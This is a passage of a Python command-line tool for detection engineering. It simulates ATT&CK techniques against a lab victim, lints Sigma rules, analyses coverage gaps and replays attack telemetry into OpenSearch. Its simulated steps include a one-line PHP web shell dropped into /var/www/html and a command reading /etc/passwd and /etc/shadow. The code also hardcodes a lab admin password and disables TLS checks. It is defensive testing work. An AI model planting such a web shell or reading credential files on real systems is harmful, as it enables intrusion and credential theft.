             "extra": {"path": "/var/www/html/shell.php", "content": "<?php system($_GET['cmd']); ?>"}},
        ],
        "T1078": [
            {"technique": "T1078", "event_type": "SYSCALL", "key": "identity_check",
             "exe": "/usr/bin/id", "uid": "33",
             "command": "id && groups",
             "extra": {}},
        ],
        "T1552.001": [
            {"technique": "T1552.001", "event_type": "PATH", "key": "sensitive_file",
             "exe": "/bin/cat", "uid": "0",
             "command": "ls -la /etc/passwd /etc/shadow 2>&1",
             "extra": {"files": ["/etc/passwd", "/etc/shadow"]}},
        ],
    }

    if not scenario_path.exists():
        err_console.print(f"[red]Scenario file not found: {scenario_path}[/]")
        raise SystemExit(1)

    with open(scenario_path) as fh:
        scenario = yaml.safe_load(fh)

    steps_config = scenario.get("steps", [])
    console.print(f"[cyan]Scenario:[/] {scenario.get('name', scenario_path.name)}")
    if scenario.get("cve"):
        console.print(f"  CVE: [bold]{scenario['cve']}[/]  CVSS: {scenario.get('cvss', '?')}")
    console.print()

    simulate_url = f"http://localhost:{agent_port}/simulate"
    total = 0
    for step_cfg in steps_config:
        tech_id = step_cfg.get("technique", "")
        variant = step_cfg.get("variant")
        steps = _TECHNIQUE_STEPS.get(tech_id, [])
        if variant:
            steps = [s for s in steps if s.get("variant") == variant] or steps[:1]
        if not steps:
            err_console.print(f"[yellow]  ⚠ No steps for technique {tech_id}[/]")
            continue
        for step in steps:
            payload = json.dumps(step).encode()
            req = urllib.request.Request(
                simulate_url,
                data=payload,
                headers={"Content-Type": "application/json"},
            )
            try:
                with urllib.request.urlopen(req, timeout=15) as resp:
                    result = json.loads(resp.read())
                rc = result.get("returncode", "?")
                out = (result.get("output") or "")[:80].replace("\n", " ")
                icon = "[green]✓[/]" if rc == 0 else "[red]✗[/]"
                console.print(f"  {icon} [bold]{tech_id}[/]  key={step.get('key','?')}  rc={rc}")
                if out:
                    console.print(f"    [dim]{out}[/]")
                total += 1
            except Exception as exc:
                err_console.print(f"  [red]✗ {tech_id}: {exc}[/]")
            _time.sleep(delay)

    console.print(f"\n[bold green]✓ {total} steps executed.[/]")


@main.command()
@click.option("--cve", "cve_id", default=None,
              help="CVE ID to simulate (e.g. CVE-2021-44228). Looks up the matching scenario.")
@click.option("--scenario", "scenario_file", default=None,
              type=click.Path(),
              help="Path to a scenario YAML (alternative to --cve).")
@click.option("--victim", default="dv-linux-victim", show_default=True,
              help="Victim container name or hostname.")
@click.option("--agent-port", default="9099", show_default=True,
              help="Victim agent HTTP port.")
@click.option("--target", default="docker",
              type=click.Choice(["docker", "vagrant"]),
              show_default=True,
              help="Attack target: docker (run atomic-runner container) or vagrant (call agent directly).")
@click.option("--mode", default="simulate",
              type=click.Choice(["simulate", "exploit"]),
              show_default=True,
              help=(
                  "simulate: POST synthetic events to /simulate (original behaviour). "
                  "exploit: send a real HTTP exploit payload to the vulnerable service "
                  "on port 8888 — generates genuine auditd kernel events."
              ))
@click.option("--vuln-port", default="9088", show_default=True,
              help="Port of the vulnerable service (exploit mode only).")
@click.option("--watch", is_flag=True, default=False,
              help="After the run, show the attack events that landed in OpenSearch.")
@click.option("--delay", default=1.5, show_default=True,
              help="Seconds between attack steps.")
def attack(
    cve_id: str | None,
    scenario_file: str | None,
    victim: str,
    agent_port: str,
    target: str,
    mode: str,
    vuln_port: str,
    watch: bool,
    delay: float,
) -> None:
    """Simulate a CVE-based attack against the Linux victim container.

    Use --target docker (default) to run via the atomic-runner container,
    or --target vagrant to call the Vagrant VM agent directly from Python.

    Use --mode exploit to send a real HTTP exploit payload to the vulnerable
    service (requires vagrant provision to have deployed vulnerable-service.py).

    \b
    Examples:
      dv attack --cve CVE-2021-44228
      dv attack --cve CVE-2021-44228 --target vagrant --mode exploit
      dv attack --cve CVE-2021-26855 --target vagrant --mode exploit --watch
      dv attack --scenario docker/atomic-runner/scenarios/proxylogon-cve-2021-26855.yml
    """
    import subprocess
    import time as _time

    # ── resolve scenario path ────────────────────────────────────────────────
    _CVE_TO_SCENARIO = {
        "CVE-2021-44228": "log4shell-cve-2021-44228.yml",
        "CVE-2021-34527": "printnightmare-cve-2021-34527.yml",
        "CVE-2021-26855": "proxylogon-cve-2021-26855.yml",
    }
    if cve_id:
        cve_id = cve_id.upper().strip()
        fname = _CVE_TO_SCENARIO.get(cve_id)
        if fname is None:
            err_console.print(f"[red]No built-in scenario for {cve_id}.[/]")
            err_console.print(f"Available: {', '.join(_CVE_TO_SCENARIO)}")
            raise SystemExit(1)
        scenario_in_container = f"/scenarios/{fname}"
        local_scenario = Path(__file__).parents[2] / "docker" / "atomic-runner" / "scenarios" / fname
    elif scenario_file:
        scenario_in_container = scenario_file
        local_scenario = Path(scenario_file)
    else:
        err_console.print("[red]Provide --cve or --scenario.[/]")
        raise SystemExit(1)

    # ── verify victim agent is reachable ────────────────────────────────────
    import urllib.request
    import urllib.error
    agent_url = f"http://localhost:{agent_port}/health"
    try:
        urllib.request.urlopen(agent_url, timeout=3)
    except Exception:
        err_console.print(f"[red]✗ Victim agent not reachable at {agent_url}[/]")
        if target == "vagrant":
            err_console.print("  Start the Vagrant VM:  cd vagrant && vagrant up")
        else:
            err_console.print("  Start it with:  docker run -d --name dv-linux-victim \\")
            err_console.print("    --network detectval-lab -p 9099:9099 \\")
            err_console.print("    detection-validator/linux-victim:dev")
        raise SystemExit(1)

    console.print(f"\n[bold cyan]⚔  Running attack scenario[/]  cve={cve_id or scenario_file}  target={target}")
    console.print(f"   Victim: [yellow]{victim}[/]  agent: {agent_url}\n")

    # ── vagrant mode: call agent directly from Python ────────────────────────
    if target == "vagrant" and mode == "exploit":
        _run_exploit_direct(cve_id or "", vuln_port)
    elif target == "vagrant":
        _run_attack_direct(local_scenario, agent_port, delay)
        # skip the Docker runner section below
    else:
        # ── docker mode: run the atomic-runner container ─────────────────────
        cmd = [
            "docker", "run", "--rm",
            "--network", "detectval-lab",
            "-e", f"RUNNER_TARGET_HOST={victim}",
            "-e", f"RUNNER_AGENT_PORT={agent_port}",
            "-e", f"RUNNER_STEP_DELAY={delay}",
            "detection-validator/atomic-runner:dev",
            "run", "--scenario", scenario_in_container,
        ]
        result = subprocess.run(cmd)
        if result.returncode != 0:
            err_console.print(f"[red]Runner exited with code {result.returncode}[/]")
            raise SystemExit(result.returncode)

    # ── optionally show events from OpenSearch ───────────────────────────────
    if watch:
        import urllib.request
        import urllib.error

        _time.sleep(5)  # let Vector flush
        console.print("\n[bold]Attack events in OpenSearch (last 20):[/]\n")
        os_url = "https://localhost:9200"
        os_user = "admin"
        os_pass = "DetectVal123!"
        query = json.dumps({
            "size": 20,
            "query": {"term": {"source.keyword": "auditd-agent"}},
            "_source": ["timestamp", "technique", "key", "exe", "uid", "cmd_output"],
        }).encode()
        try:
            import base64
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            creds = base64.b64encode(f"{os_user}:{os_pass}".encode()).decode()
            req = urllib.request.Request(
                f"{os_url}/dv-telemetry-*/_search",
                data=query,
                headers={"Content-Type": "application/json", "Authorization": f"Basic {creds}"},
            )
            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                data = json.loads(resp.read())
            hits = data.get("hits", {}).get("hits", [])
            if not hits:
                console.print("  [yellow]No auditd-agent events yet — Vector may still be flushing.[/]")
            for h in hits:
                s = h["_source"]
                out = s.get("cmd_output", "")[:100].replace("\n", " ")
                console.print(
                    f"  [green]{s.get('technique','?'):12s}[/]  "
                    f"[cyan]{s.get('key','?'):20s}[/]  "
                    f"exe={s.get('exe','?'):30s}  uid={s.get('uid','?')}"
                )
                if out:
                    console.print(f"    [dim]{out}[/]")
        except Exception as exc:
            err_console.print(f"[yellow]Could not query OpenSearch: {exc}[/]")

    console.print(
        f"\n[bold green]✓ Done.[/] View events:\n"
        f"  OpenSearch Dashboards: [cyan]http://localhost:5601[/]\n"
        f"  Splunk mock UI:        [cyan]http://localhost:8000[/]"
    )


@main.command("lint")
@click.argument("rules", default=".")
@click.option("--min-score", default=0, show_default=True,
              help="Only show rules with quality score below this threshold (0 = show all).")
@click.option("--export-md", default=None, metavar="FILE",
              help="Write a Markdown lint report to FILE.")
def lint_cmd(rules: str, min_score: int, export_md: str | None) -> None:
    """Static quality analysis of detection rules — no SIEM required.

    Checks each rule for: missing logsource, overly broad wildcards, missing
    condition, empty detection block, and missing ATT&CK tag.  Produces a
    0-100 quality score per rule.

    \b
    Examples:
      dv lint examples/detections/sigma/
      dv lint rules/ --min-score 70
      dv lint rules/ --export-md lint-report.md
    """
    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError
    from detection_validator.validator.static_lint import StaticLinter, LintSeverity
    from rich.table import Table
    from rich import box as _box
    import io

    registry = ParserRegistry()
    rules_path = Path(rules)
    if rules_path.is_file():
        rule_files = [rules_path]
    else:
        rule_files = sorted(
            f for f in rules_path.rglob("*")
            if f.suffix in (".yml", ".yaml", ".json", ".toml", ".spl", ".kql", ".yar")
        )

    if not rule_files:
        err_console.print(f"[red]No rule files found under {rules}[/]")
        raise SystemExit(1)

    linter = StaticLinter()
    detections = []
    parse_errors: list[tuple[str, str]] = []

    for fpath in rule_files:
        try:
            det = registry.parse_file(fpath)
            if det:
                detections.extend(det if isinstance(det, list) else [det])
        except (ParseError, Exception) as exc:
            parse_errors.append((str(fpath), str(exc)))

    if not detections and not parse_errors:
        console.print("[yellow]No parseable rules found.[/]")
        return

    lint_results = linter.lint_all(detections)

    tbl = Table(show_header=True, header_style="bold", box=_box.SIMPLE, padding=(0, 1))
    tbl.add_column("Rule", style="white", max_width=36)
    tbl.add_column("Score", width=6, justify="right")
    tbl.add_column("Sev", width=5)
    tbl.add_column("Code", width=22)
    tbl.add_column("Finding", style="dim", max_width=48)

    shown = 0
    md_lines: list[str] = ["# Detection Lint Report\n",
                            "| Rule | Score | Sev | Code | Finding |",
                            "|---|---|---|---|---|"]

    for det in detections:
        findings = lint_results.get(str(det.id), [])
        score = linter.score(findings)
        if min_score and score >= min_score:
            continue
        shown += 1
        score_color = "green" if score >= 80 else "yellow" if score >= 50 else "red"
        if not findings:
            tbl.add_row(det.name[:36], f"[{score_color}]{score}[/]", "", "", "[dim]OK[/]")
            md_lines.append(f"| {det.name} | {score} | | | OK |")
        for f in findings:
            sev_color = {"error": "red", "warning": "yellow", "info": "dim"}.get(f.severity, "white")
            tbl.add_row(
                det.name[:36],
                f"[{score_color}]{score}[/]",
                f"[{sev_color}]{f.severity[:4].upper()}[/]",
                f.code,
                f.message[:48],
            )
            md_lines.append(f"| {det.name} | {score} | {f.severity} | {f.code} | {f.message} |")

    for fpath, err in parse_errors:
        tbl.add_row(Path(fpath).name[:36], "[dim]N/A[/]", "[red]ERR[/]", "PARSE_ERROR", err[:48])
        md_lines.append(f"| {Path(fpath).name} | N/A | error | PARSE_ERROR | {err} |")

    console.print(tbl)
    console.print(
        f"\n[bold]Linted:[/] {len(detections)} rule(s)  "
        f"[dim]{len(parse_errors)} parse error(s)[/]  "
        f"shown={shown or len(detections)}"
    )

    if export_md:
        Path(export_md).write_text("\n".join(md_lines) + "\n", encoding="utf-8")
        err_console.print(f"[green]✓[/] Markdown report written to [bold]{export_md}[/]")


@main.command("gaps")
@click.option("--detections", "-d", required=True, type=click.Path(exists=True),
              help="JSONL file of CanonicalDetection objects (from dv ingest/map).")
@click.option("--prioritize", is_flag=True, default=False,
              help="Sort by composite priority score and show why each gap ranks high.")
@click.option("--top-n", default=0, show_default=True,
              help="Limit output to the top N gaps (0 = all).")
@click.option("--tactic", default=None, metavar="TACTIC[,TACTIC...]",
              help="Filter to specific tactic(s), e.g. initial-access,execution.")
@click.option("--no-subtechniques", is_flag=True, default=False,
              help="Only show base techniques, not sub-techniques.")
@click.option("--format", "fmt", default="cli", show_default=True,
              type=click.Choice(["cli", "json"]))
def gaps_cmd(
    detections: str, prioritize: bool, top_n: int,
    tactic: str | None, no_subtechniques: bool, fmt: str,
) -> None:
    """Identify ATT&CK technique gaps not covered by the detection corpus.

    Uses only locally cached STIX data — no network, no API keys needed.
    Run 'dv intel update --source attack' first if the cache is empty.

    \b
    Priority score (--prioritize) is a 0–100 composite of:
      • Prevalence (0–40 pts): groups + software using the technique in STIX
      • Tactic weight (0–40 pts): Initial Access / Execution / Impact rank highest
      • Parent severity (0–20 pts): for uncovered sub-techniques whose parent IS
        covered — the max severity of the covering rules adds urgency

    \b
    Examples:
      dv gaps -d mapped.jsonl
      dv gaps -d mapped.jsonl --prioritize
      dv gaps -d mapped.jsonl --prioritize --top-n 20
      dv gaps -d mapped.jsonl --prioritize --tactic initial-access,execution
      dv gaps -d mapped.jsonl --prioritize --format json
    """
    import json as _json
    from detection_validator.normalizer.schema import CanonicalDetection
    from detection_validator.mappers.attack_mapper import AttackKnowledgeBase, _DEFAULT_CACHE_DIR
    from detection_validator.coverage.gap_analyzer import GapAnalyzer
    from rich.table import Table
    from rich import box as _box

    # ── Load corpus ───────────────────────────────────────────────────────────
    corpus: list[CanonicalDetection] = []
    with open(detections, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                corpus.append(CanonicalDetection.model_validate_json(line))
            except Exception:
                continue

    if not corpus:
        err_console.print("[red]No valid detections found in the file.[/]")
        raise SystemExit(1)

    # ── Load ATT&CK KB from local STIX cache ─────────────────────────────────
    kb = AttackKnowledgeBase(cache_dir=_DEFAULT_CACHE_DIR)
    if not kb._bundle_path.exists():
        err_console.print(
            "[red]ATT&CK STIX cache is missing.[/]  "
            "Run: [cyan]dv intel update --source attack[/]"
        )
        raise SystemExit(1)
    if not kb._is_cache_valid():
        err_console.print(
            "[yellow]⚠ ATT&CK cache is stale (>7 days). "
            "Run [cyan]dv intel update --source attack[/yellow] to refresh."
        )
    kb.ensure_loaded()

    # ── Run gap analysis ──────────────────────────────────────────────────────
    analyzer = GapAnalyzer(kb)
    include_sub = not no_subtechniques
    all_gaps = analyzer.analyze(corpus, include_subtechniques=include_sub)

    # Tactic filter
    filter_tactics: set[str] | None = None
    if tactic:
        filter_tactics = {t.strip().lower() for t in tactic.split(",")}
        all_gaps = [g for g in all_gaps if g.tactic in filter_tactics]

    # Top-n
    shown = all_gaps[:top_n] if top_n > 0 else all_gaps

    # ── JSON output ───────────────────────────────────────────────────────────
    if fmt == "json":
        payload = [
            {
                "technique_id": g.technique_id,
                "name": g.name,
                "tactic": g.tactic,
                "score": g.score,
                "prevalence": g.prevalence,
                "tactic_weight": g.tactic_weight,
                "parent_id": g.parent_id,
                "parent_covered": g.parent_covered,
                "parent_max_severity": g.parent_max_severity,
                "reasons": g.reasons,
            }
            for g in shown
        ]
        console.print_json(_json.dumps(payload, indent=2))
        return

    # ── CLI table ─────────────────────────────────────────────────────────────
    tbl = Table(
        show_header=True, header_style="bold",
        box=_box.SIMPLE, padding=(0, 1),
    )
    tbl.add_column("Technique", style="white", min_width=10)
    tbl.add_column("Name", max_width=36)
    tbl.add_column("Tactic", style="cyan", max_width=22)
    if prioritize:
        tbl.add_column("Score", width=6, justify="right")
        tbl.add_column("Prev.", width=5, justify="right")
        tbl.add_column("Why", style="dim", max_width=52)

    for g in shown:
        score_color = (
            "red" if g.score >= 60 else
            "yellow" if g.score >= 35 else
            "dim"
        )
        if prioritize:
            why = " | ".join(g.reasons)
            tbl.add_row(
                g.technique_id,
                g.name[:36],
                g.tactic,
                f"[{score_color}]{g.score:.0f}[/]",
                str(g.prevalence),
                why[:52],
            )
        else:
            tbl.add_row(g.technique_id, g.name[:36], g.tactic)

    console.print(tbl)

    covered_count = len(kb._techniques) - len(all_gaps) - len([
        t for t in kb.get_all_techniques(include_subtechniques=include_sub)
        if t.technique_id not in {g.technique_id for g in all_gaps}
    ]) + len(corpus)  # rough count

    total_kb = len(kb.get_all_techniques(
        include_deprecated=False, include_subtechniques=include_sub
    ))
    covered_n = total_kb - len(all_gaps)

    mode_label = " [cyan](prioritized)[/]" if prioritize else ""
    console.print(
        f"\n[bold]Gap analysis{mode_label}:[/] "
        f"{len(shown)} gap(s) shown  "
        f"({covered_n}/{total_kb} techniques covered  "
        f"{covered_n/total_kb*100:.0f}%)"
    )
    if filter_tactics:
        console.print(f"  [dim]Filtered to tactics: {', '.join(sorted(filter_tactics))}[/]")
    if top_n and len(all_gaps) > top_n:
        console.print(f"  [dim](showing top {top_n} of {len(all_gaps)} total gaps)[/]")


@main.command("query")
@click.argument("rule", type=click.Path(exists=True))
@click.option("--siem", default="opensearch,elastic,splunk", show_default=True,
              help="Comma-separated backends: opensearch, elastic, splunk.")
@click.option("--deployable", is_flag=True, default=False,
              help="Also produce deployable artifact formats (monitor_rule, kibana_ndjson, savedsearches).")
@click.option("--export-dir", default=None, metavar="DIR",
              help="Write query files to this directory instead of printing to stdout.")
def query_cmd(rule: str, siem: str, deployable: bool, export_dir: str | None) -> None:
    """Compile a Sigma rule to SIEM queries offline — no live SIEM needed.

    Reads a single Sigma YAML rule file and compiles it to runnable queries
    for the requested backends using pySigma.  No credentials or network
    access required.

    \b
    Output formats per backend:
      opensearch   default (Lucene)  + monitor_rule (JSON, --deployable)
      elastic      default (Lucene)  + kibana_ndjson (--deployable)
      splunk       default (SPL)     + savedsearches.conf (--deployable)

    \b
    Examples:
      dv query examples/detections/sigma/log4shell_jndi_injection.yml
      dv query rule.yml --siem opensearch,splunk --deployable
      dv query rule.yml --siem elastic --deployable --export-dir reports/queries
    """
    from detection_validator.siem.query_gen import generate_queries

    siems = [s.strip() for s in siem.split(",") if s.strip()]
    results = generate_queries(rule, siems=siems, deployable=deployable)

    export_path = Path(export_dir) if export_dir else None
    if export_path:
        export_path.mkdir(parents=True, exist_ok=True)

    rule_stem = Path(rule).stem
    any_error = False

    for r in results:
        tag = f"{r.siem}/{r.fmt}"
        if r.query is None:
            err_console.print(f"[red]✗[/] [{tag}]  {r.error}")
            any_error = True
            continue

        if export_path:
            ext_map = {
                "monitor_rule": "json",
                "kibana_ndjson": "ndjson",
                "savedsearches": "conf",
                "default": "txt",
            }
            ext = ext_map.get(r.fmt, "txt")
            fname = f"{rule_stem}__{r.siem}__{r.fmt}.{ext}"
            out_file = export_path / fname
            out_file.write_text(r.query, encoding="utf-8")
            deploy_flag = " [cyan](deployable)[/]" if r.deployable else ""
            console.print(f"[green]✓[/] [{tag}]{deploy_flag} → {out_file}")
        else:
            deploy_flag = " [cyan](deployable)[/]" if r.deployable else ""
            console.rule(f"[bold]{tag}[/]{deploy_flag}")
            console.print(r.query)
            console.print()

    if any_error and not results:
        raise SystemExit(1)


@main.group()
def telemetry() -> None:
    """Fetch and index pre-recorded telemetry for offline detection testing."""


@telemetry.command("capture")
@click.option("--technique", "-t", required=True, metavar="TID",
              help="ATT&CK technique ID, e.g. T1003.001")
@click.option("--source", "source_name", default="replay", show_default=True,
              help="Telemetry source name from the registry (dv telemetry sources).")
@click.option("--platform", default="windows", show_default=True,
              help="Target platform passed to the source (use 'linux' with --source live-local).")
@click.option("--file", "file_path", default=None, type=click.Path(exists=True),
              help="Load events from a local JSON/JSONL file instead of OTRF.")
@click.option("--os-url", default="http://localhost:9200", show_default=True,
              help="OpenSearch base URL for bulk indexing.")
@click.option("--no-index", is_flag=True, default=False,
              help="Skip OpenSearch indexing; only normalise and print summary.")
@click.option("--i-understand", "i_understand", is_flag=True, default=False,
              help="Allow destructive atomics (elevation required or system modification).")
def telemetry_capture(
    technique: str,
    source_name: str,
    platform: str,
    file_path: str | None,
    os_url: str,
    no_index: bool,
    i_understand: bool,
) -> None:
    """Fetch a pre-recorded OTRF dataset and index it into OpenSearch.

    Downloads the matching dataset for TECHNIQUE from the OTRF Security-Datasets
    repository (or loads from --file), normalises every event to the ECS/Sysmon
    schema, and bulk-indexes them into OpenSearch for use with `dv validate`.

    Fully offline — works for Windows detections on any host OS (Mac, Linux).
    The dataset is cached under data/otrf/ so subsequent runs are instant.

    \b
    Examples:
      dv telemetry capture --technique T1003.001
      dv telemetry capture --technique T1003.001 --no-index
      dv telemetry capture --technique T1003.001 --file events.json
      dv telemetry capture --technique T1059.001 --platform windows
    """
    from detection_validator.telemetry.base import NotAvailable, registry
    from detection_validator.telemetry.replay import ReplaySource
    from detection_validator.telemetry.indexer import bulk_index, index_name_for

    # Build the source — user-supplied file overrides the registry lookup.
    # live-local is constructed fresh (not from registry) so --i-understand is wired in.
    if file_path:
        source = ReplaySource(file_path=file_path)
        source_label = f"file:{Path(file_path).name}"
    elif source_name == "live-local":
        from detection_validator.telemetry.live_local import LiveLocalSource
        source = LiveLocalSource(i_understand=i_understand)
        source_label = "live-local"
    else:
        try:
            source = registry.get(source_name)
        except KeyError as exc:
            err_console.print(f"[red]✗[/] {exc}")
            raise SystemExit(1)
        source_label = source_name

    console.print(
        f"\n[bold cyan]Fetching telemetry[/]  "
        f"technique=[bold]{technique}[/]  source=[bold]{source_label}[/]  "
        f"platform={platform}\n"
    )

    # ── 1: ensure() — fetch + normalise ──────────────────────────────────────
    try:
        batch = source.ensure(technique, platform)
    except NotAvailable as exc:
        err_console.print(f"[red]✗ Not available:[/] {exc.reason}")
        raise SystemExit(1)

    dataset_label = batch.source_name.removeprefix("otrf:")
    console.print(f"  [green]✓[/] Dataset   [bold]{dataset_label}[/]")
    console.print(f"  [green]✓[/] Events    [bold]{len(batch):,}[/]  (fidelity={batch.fidelity})")

    capture_index = index_name_for(technique, batch.fidelity)

    if no_index:
        console.print("  [dim]Indexing skipped (--no-index)[/]")
        _print_capture_summary(technique, dataset_label, len(batch), capture_index, indexed=False)
        return

    # ── 2: Bulk-index into OpenSearch ─────────────────────────────────────────
    console.print(f"\n  Indexing into OpenSearch at [cyan]{os_url}[/]…", end="", flush=True)
    try:
        indexed, errors = bulk_index(batch, os_url=os_url)
    except IndexError as exc:
        console.print()
        err_console.print(f"[red]✗ Indexing failed:[/] {exc}")
        console.print("\n  [yellow]Events were normalised but not indexed.[/]")
        console.print("  Start OpenSearch:  [cyan]dv siem up[/]")
        _print_capture_summary(technique, dataset_label, len(batch), capture_index, indexed=False)
        raise SystemExit(1)

    console.print(f" [green]✓[/]")
    if errors:
        err_console.print(f"  [yellow]⚠ {len(errors)} document(s) failed to index[/]")

    _print_capture_summary(technique, dataset_label, indexed, capture_index, indexed=True)


def _print_capture_summary(
    technique: str,
    dataset: str,
    event_count: int,
    index: str,
    *,
    indexed: bool,
) -> None:
    from rich.table import Table as _Table

    tbl = _Table(show_header=False, box=None, padding=(0, 2))
    tbl.add_column("Field", style="dim")
    tbl.add_column("Value", style="bold")

    tbl.add_row("Technique", technique)
    tbl.add_row("Dataset", dataset)
    tbl.add_row("Events", f"{event_count:,}")
    tbl.add_row("Index", index)
    tbl.add_row("Indexed", "[green]yes[/]" if indexed else "[yellow]no (run dv siem up first)[/]")

    console.print()
    console.print("[bold]Capture summary[/]")
    console.print(tbl)

    if indexed:
        console.print(
            f"\n  [dim]Run:[/] [cyan]dv validate examples/detections/sigma/ "
            f"--since 0 --index {index}[/]"
        )


@telemetry.command("sources")
def telemetry_sources() -> None:
    """List registered telemetry sources."""
    from detection_validator.telemetry.base import registry

    names = registry.list_sources()
    if not names:
        console.print("[dim]No sources registered.[/]")
        return

    from rich.table import Table as _Table
    tbl = _Table(show_header=True, header_style="bold", box=None, padding=(0, 2))
    tbl.add_column("Name", style="bold")
    tbl.add_column("Fidelity", style="cyan")
    tbl.add_column("Platforms")

    for name in names:
        src = registry.get(name)
        desc = src.describe()
        tbl.add_row(name, desc.fidelity, ", ".join(desc.supported_platforms))

    console.print(tbl)


@main.command("validate-live")
@click.option("--rule-id", required=True, metavar="ID_OR_PATH",
              help="Rule UUID (scanned from --rules-dir) or path to a Sigma YAML file.")
@click.option("--source", "source_name", default="replay", show_default=True,
              help="Telemetry source: replay or live-local.")
@click.option("--i-understand", "i_understand", is_flag=True, default=False,
              help="Allow destructive atomics when using --source live-local.")
@click.option("--platform", default="windows", show_default=True,
              help="Target platform passed to source.ensure().")
@click.option("--rules-dir", default="examples/detections/sigma", show_default=True,
              type=click.Path(), help="Directory scanned when --rule-id is a UUID.")
@click.option("--os-url", default="http://localhost:9200", show_default=True,
              help="OpenSearch base URL.")
@click.option("--file", "file_path", default=None, type=click.Path(exists=True),
              help="Use a local JSON/JSONL file as the telemetry source instead of OTRF.")
def validate_live_cmd(
    rule_id: str,
    source_name: str,
    i_understand: bool,
    platform: str,
    rules_dir: str,
    os_url: str,
    file_path: str | None,
) -> None:
    """Recall-validate a rule against known-attack telemetry.

    \b
    ╔══════════════════════════════════════════════════════════════╗
    ║  ⚠  RECALL TEST — not a false-positive rate assessment      ║
    ║                                                              ║
    ║  This runs your rule against events we *know* are attack     ║
    ║  activity (OTRF Security-Datasets or live capture).          ║
    ║                                                              ║
    ║  VALIDATED_RECALL = rule fires on real attack events         ║
    ║  MISSED           = attack telemetry present, rule missed it ║
    ║  NOT_VALIDATABLE  = no telemetry available (reason shown)    ║
    ║                                                              ║
    ║  This does NOT test false-positive rate. For FP rate you     ║
    ║  need benign baseline traffic, which this command does not   ║
    ║  provide.                                                    ║
    ╚══════════════════════════════════════════════════════════════╝

    \b
    Examples:
      dv validate-live --rule-id examples/detections/sigma/credential_dump_lsass.yml
      dv validate-live --rule-id b3c5e9a1-72f4-4c9e-b8d3-125e4f6a7c8d
      dv validate-live --rule-id path/to/rule.yml --source live-local
      dv validate-live --rule-id path/to/rule.yml --file data/my-events.json
    """
    from detection_validator.telemetry.base import registry as tel_registry
    from detection_validator.telemetry.replay import ReplaySource
    from detection_validator.validator.validate_live import (
        RecallVerdict,
        LiveValidationResult,
        resolve_rule,
        validate_live,
    )

    # ── 1: Load rule ──────────────────────────────────────────────────────────
    try:
        detection, rule_path = resolve_rule(rule_id, Path(rules_dir))
    except FileNotFoundError as exc:
        err_console.print(f"[red]✗[/] {exc}")
        raise SystemExit(1)

    # ── 2: Build source ───────────────────────────────────────────────────────
    # live-local is constructed fresh so --i-understand is wired in properly.
    if file_path:
        source = ReplaySource(file_path=file_path)
        source_label = f"file:{Path(file_path).name}"
    elif source_name == "live-local":
        from detection_validator.telemetry.live_local import LiveLocalSource
        source = LiveLocalSource(i_understand=i_understand)
        source_label = "live-local"
    else:
        try:
            source = tel_registry.get(source_name)
        except KeyError as exc:
            err_console.print(f"[red]✗[/] {exc}")
            raise SystemExit(1)
        source_label = source_name

    # ── 3: Print recall banner ────────────────────────────────────────────────
    console.print()
    console.rule("[bold yellow]⚠  RECALL TEST — not a false-positive assessment[/]")
    console.print(
        "  [dim]This measures whether the rule fires on known-attack events.[/]\n"
        "  [dim]It does NOT measure false-positive rate.[/]\n"
    )

    console.print(
        f"  Rule    [bold]{detection.name}[/]  ([dim]{detection.id[:8]}…[/])\n"
        f"  Source  [bold]{source_label}[/]  platform={platform}\n"
        f"  SIEM    [cyan]{os_url}[/]\n"
    )

    # ── 4: Run validation ─────────────────────────────────────────────────────
    from rich.progress import Progress, SpinnerColumn, TextColumn

    with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                  transient=True, console=err_console) as prog:
        prog.add_task("Fetching telemetry and running query…", total=None)
        result: LiveValidationResult = validate_live(
            detection=detection,
            source=source,
            rule_path=rule_path,
            platform=platform,
            os_url=os_url,
        )

    # ── 5: Print per-technique results ────────────────────────────────────────
    from rich.table import Table as _Table

    tbl = _Table(show_header=True, header_style="bold", box=None, padding=(0, 2))
    tbl.add_column("Technique", style="cyan", width=12)
    tbl.add_column("Verdict", width=20)
    tbl.add_column("Events", justify="right", width=7)
    tbl.add_column("Hits", justify="right", width=6)
    tbl.add_column("Index", style="dim")

    _VERDICT_STYLE = {
        RecallVerdict.VALIDATED_RECALL: ("VALIDATED_RECALL", "green"),
        RecallVerdict.MISSED: ("MISSED", "red"),
        RecallVerdict.NOT_VALIDATABLE: ("NOT_VALIDATABLE", "yellow"),
    }

    any_error = False
    for tr in result.technique_results:
        label, style = _VERDICT_STYLE[tr.verdict]
        tbl.add_row(
            tr.technique_id,
            f"[{style}]{label}[/]",
            str(tr.event_count) if tr.event_count else "-",
            str(tr.match_count) if tr.match_count else "-",
            tr.index or "-",
        )
        if tr.not_available_reason:
            tbl.add_row("", f"  [dim]{tr.not_available_reason[:72]}[/]", "", "", "")
        if tr.verdict == RecallVerdict.NOT_VALIDATABLE:
            any_error = True

    console.print(tbl)
    console.print()

    # ── 6: Lucene query + Dashboards hint ─────────────────────────────────────
    for tr in result.technique_results:
        if tr.lucene_query and tr.verdict != RecallVerdict.NOT_VALIDATABLE:
            console.print("[bold]Query (paste into Dashboards search bar):[/]")
            console.print(f"  [cyan]{tr.lucene_query[:200]}[/]\n")
            break

    console.print("[bold]OpenSearch Dashboards[/]")
    console.print(f"  UI:  [cyan]http://localhost:5601[/]")
    for tr in result.technique_results:
        if tr.index:
            console.print(f"  Index:  [cyan]{tr.index}[/]")
            break

    console.print()
    console.rule()

    # ── 7: Overall verdict + recall disclaimer ────────────────────────────────
    overall = result.overall_verdict
    label, style = _VERDICT_STYLE[overall]
    console.print(f"\n  Overall: [{style}][bold]{label}[/][/]\n")

    console.print(
        "  [dim]Reminder: VALIDATED_RECALL confirms detection fires on attack events.[/]\n"
        "  [dim]To measure false-positive rate, run the rule against benign traffic.[/]\n"
    )

    if any_error:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
